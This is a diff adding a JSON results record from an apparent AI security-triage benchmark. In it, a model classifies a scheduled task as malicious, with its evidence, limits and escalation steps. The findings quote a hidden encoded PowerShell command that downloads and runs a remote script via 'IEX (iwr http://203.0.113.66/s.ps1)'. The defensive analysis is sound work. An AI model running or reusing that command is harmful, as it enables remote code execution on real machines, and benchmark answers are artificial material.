@@ -1,0 +1,82 @@
+{
+ "scenario_id": "S23",
+ "condition": "C1",
+ "variant": "P2",
+ "backend": "openai:gpt-6.1-sol",
+ "sample": 0,
+ "attempts": [
+  {
+   "answer": "{\n  \"assessment\": \"malicious\",\n  \"confidence\": 0.98,\n  \"supporting_observations\": [\n    {\n      \"claim\": \"At 13:41:04 UTC, WS-HITO-01 registered task \\\\Microsoft\\\\Windows\\\\SyncCheck under RIVERBEND\\\\hana.ito, with an enabled time trigger and a PowerShell action.\",\n      \"claim_type\": \"observed_fact\",\n      \"record_ids\": [\n        \"S23-00116\"\n      ]\n    },\n    {\n      \"claim\": \"The task invokes powershell.exe with '-nop -w hidden -enc'. Its UTF-16LE Base64 argument decodes to 'IEX (iwr http://203.0.113.66/s.ps1)', a command intended to retrieve a remote script over HTTP and execute the returned content.\",\n      \"claim_type\": \"observed_fact\",\n      \"record_ids\": [\n        \"S23-00116\"\n      ]\n    },\n    {\n      \"claim\": \"Compared with the supplied deployment practices and change calendar, this is not the scheduled VetChart deployment pattern: the task is attributed to hana.ito rather than dev.sharma, is outside \\\\RB-IT\\\\Deploy-<App>, and invokes encoded PowerShell against an IP-address URL rather than msiexec with an installer from \\\\\\\\FILE-RB-01\\\\Deploy.\",\n      \"claim_type\": \"inferred_claim\",\n      \"record_ids\": [\n        \"S23-00116\"\n      ]\n    },\n    {\n      \"claim\": \"The combination of a Windows-looking task path, hidden encoded PowerShell, and direct remote-content execution supports a malicious scheduled-task registration finding independently of unrelated software activity. The finding concerns the registered action, not proof that its payload executed successfully.\",\n      \"claim_type\": \"inferred_claim\",\n      \"record_ids\": [\n        \"S23-00116\"\n      ]\n    }\n  ],\n  \"known_telemetry_limitations\": [\n    \"S23-00116 is a task-registration event; it does not establish task launch, successful script retrieval, or execution of downloaded content.\",\n    \"The supplied evidence does not include task-specific execution results, PowerShell script-block content, or a network transaction for the URL decoded from S23-00116.\"\n  ],\n  \"claims_not_established\": [\n    \"Whether the task ran or successfully retrieved and executed s.ps1.\",\n    \"The remote script's contents, capabilities, or downstream effects.\",\n    \"Who actually caused the registration; the account attribution in S23-00116 does not prove hana.ito personally initiated it.\",\n    \"Initial access, credential theft, privilege escalation, lateral movement, or data exfiltration.\",\n    \"Recurring persistence: S23-00116 shows a time trigger, not a repeating schedule.\"\n  ],\n  \"recommended_action\": \"escalate\",\n  \"additional_evidence_needed\": [\n    \"Preserve the task XML and Task Scheduler operational history, then disable the task pending investigation.\",\n    \"Collect process-creation, PowerShell operational/script-block, and EDR telemetry around 13:41 UTC to identify the registration process and any task execution.\",\n    \"Search proxy, firewall, and endpoint network telemetry for 203.0.113.66 and /s.ps1; obtain any retained response content without executing it.\",\n    \"Confirm task authorization with dev.sharma and investigate the hana.ito session that registered it.\",\n    \"Assess WS-HITO-01 for related artifacts and contain the endpoint according to incident-response procedures.\"\n  ],\n  \"unrelated_findings\": [\n    \"Separate software-authorization review: Zoom executed under hana.ito and Zoom web-client requests were observed; Zoom is not listed among approved software in the supplied inventory. These records do not establish a connection to the alerted task (S23-00003, S23-00029, S23-00034).\",\n    \"Separate software-authorization review: Webex executed under hana.ito, and a proxy request identified itself as Cisco Secure Client. These products are not listed among approved software; the proxy user-agent alone does not verify Secure Client installation. Neither observation establishes a connection to the alerted task (S23-00142, S23-00148, S23-00149).\"\n  ]\n}",
+   "valid": true,
+   "errors": [],
+   "usage": {
+    "input": 32594,
+    "output": 1000
+   }
+  }
+ ],
+ "parsed": {
+  "assessment": "malicious",
+  "confidence": 0.98,
+  "supporting_observations": [
+   {
+    "claim": "At 13:41:04 UTC, WS-HITO-01 registered task \\Microsoft\\Windows\\SyncCheck under RIVERBEND\\hana.ito, with an enabled time trigger and a PowerShell action.",
+    "claim_type": "observed_fact",
+    "record_ids": [
+     "S23-00116"
+    ]
+   },
+   {
+    "claim": "The task invokes powershell.exe with '-nop -w hidden -enc'. Its UTF-16LE Base64 argument decodes to 'IEX (iwr http://203.0.113.66/s.ps1)', a command intended to retrieve a remote script over HTTP and execute the returned content.",
+    "claim_type": "observed_fact",
+    "record_ids": [
+     "S23-00116"
+    ]
+   },
+   {
+    "claim": "Compared with the supplied deployment practices and change calendar, this is not the scheduled VetChart deployment pattern: the task is attributed to hana.ito rather than dev.sharma, is outside \\RB-IT\\Deploy-<App>, and invokes encoded PowerShell against an IP-address URL rather than msiexec with an installer from \\\\FILE-RB-01\\Deploy.",
+    "claim_type": "inferred_claim",
+    "record_ids": [
+     "S23-00116"
+    ]
+   },
+   {
+    "claim": "The combination of a Windows-looking task path, hidden encoded PowerShell, and direct remote-content execution supports a malicious scheduled-task registration finding independently of unrelated software activity. The finding concerns the registered action, not proof that its payload executed successfully.",
+    "claim_type": "inferred_claim",
+    "record_ids": [
+     "S23-00116"
+    ]
+   }
+  ],
+  "known_telemetry_limitations": [
+   "S23-00116 is a task-registration event; it does not establish task launch, successful script retrieval, or execution of downloaded content.",
+   "The supplied evidence does not include task-specific execution results, PowerShell script-block content, or a network transaction for the URL decoded from S23-00116."
+  ],
+  "claims_not_established": [
+   "Whether the task ran or successfully retrieved and executed s.ps1.",
+   "The remote script's contents, capabilities, or downstream effects.",
+   "Who actually caused the registration; the account attribution in S23-00116 does not prove hana.ito personally initiated it.",
+   "Initial access, credential theft, privilege escalation, lateral movement, or data exfiltration.",
+   "Recurring persistence: S23-00116 shows a time trigger, not a repeating schedule."
+  ],
+  "recommended_action": "escalate",
+  "additional_evidence_needed": [
+   "Preserve the task XML and Task Scheduler operational history, then disable the task pending investigation.",
+   "Collect process-creation, PowerShell operational/script-block, and EDR telemetry around 13:41 UTC to identify the registration process and any task execution.",
+   "Search proxy, firewall, and endpoint network telemetry for 203.0.113.66 and /s.ps1; obtain any retained response content without executing it.",
+   "Confirm task authorization with dev.sharma and investigate the hana.ito session that registered it.",
+   "Assess WS-HITO-01 for related artifacts and contain the endpoint according to incident-response procedures."
+  ],
+  "unrelated_findings": [
+   "Separate software-authorization review: Zoom executed under hana.ito and Zoom web-client requests were observed; Zoom is not listed among approved software in the supplied inventory. These records do not establish a connection to the alerted task (S23-00003, S23-00029, S23-00034).",
+   "Separate software-authorization review: Webex executed under hana.ito, and a proxy request identified itself as Cisco Secure Client. These products are not listed among approved software; the proxy user-agent alone does not verify Secure Client installation. Neither observation establishes a connection to the alerted task (S23-00142, S23-00148, S23-00149)."
+  ]
+ },
+ "status": "VALID",
+ "faithfulness_precheck": {
+  "n_cited": 4,
+  "n_missing": 0,
+  "missing": []
+ },
+ "duration_s": 18.4
+}
